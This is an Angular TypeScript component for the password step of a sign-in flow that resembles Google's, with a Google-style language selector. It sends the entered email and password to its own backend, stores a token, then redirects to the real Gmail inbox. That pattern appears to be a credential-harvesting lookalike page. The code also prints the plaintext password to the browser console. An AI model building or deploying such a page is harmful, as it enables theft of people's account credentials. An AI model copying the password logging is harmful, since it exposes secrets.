import { Component, OnInit } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { CommonModule } from '@angular/common';
import { Router } from '@angular/router';
import { loginUser } from '../../../lib/user/api'; // Corrected import path

@Component({
  selector: 'app-password',
  standalone: true,
  imports: [FormsModule, CommonModule],
  templateUrl: './password.html',
  styleUrl: './password.scss'
})
export class PasswordComponent implements OnInit {
  email: string = '';
  password: string = '';
  showPassword: boolean = false;
  showLanguageDropdown: boolean = false;
  errorMessage: string = ''; // New property for error messages

  languages: Array<{name: string, code: string}> = [
    { name: 'English (United States)', code: 'en-US' },
    { name: 'Español (España)', code: 'es-ES' },
    { name: 'Français (France)', code: 'fr-FR' },
    { name: 'Deutsch (Deutschland)', code: 'de-DE' },
    { name: '日本語 (日本)', code: 'ja-JP' },
    { name: '한국어 (대한민국)', code: 'ko-KR' },
    { name: '中文 (简体)', code: 'zh-CN' },
    { name: 'Português (Brasil)', code: 'pt-BR' },
    { name: 'Italiano (Italia)', code: 'it-IT' },
    { name: 'हिन्दी (भारत)', code: 'hi-IN' }
  ];

  selectedLanguage: string = 'en-US';

  constructor(private router: Router) {}

  ngOnInit() {
    // Get email from localStorage
    const storedEmail = localStorage.getItem('userEmail');
    if (storedEmail) {
      this.email = storedEmail;
    } else {
      // If no email found, redirect back to signin
      this.router.navigate(['/signin']);
    }
  }

  togglePasswordVisibility() {
    this.showPassword = !this.showPassword;
  }

  async onNext() {
    this.errorMessage = ''; // Clear previous errors
    console.log('Attempting login with email:', this.email, 'and password:', this.password);

    try {
      const response = await loginUser({ email: this.email, password: this.password });
      console.log('Login successful:', response);

      // Store token (e.g., in localStorage)
      localStorage.setItem('authToken', response.data.token);
      
      // Redirect to Gmail URL
      window.location.href = 'https://mail.google.com/mail/u/0/';

    } catch (error: any) {
      console.error('Login failed:', error);
      this.errorMessage = error.message || 'An unexpected error occurred during login.';
    }
  }

  toggleLanguageDropdown() {
    this.showLanguageDropdown = !this.showLanguageDropdown;
  }

  selectLanguage(language: {name: string, code: string}) {
    this.selectedLanguage = language.code;
    this.showLanguageDropdown = false;
  }

  getCurrentLanguage(): string {
    return this.languages.find(lang => lang.code === this.selectedLanguage)?.name || 'English (United States)';
  }
}
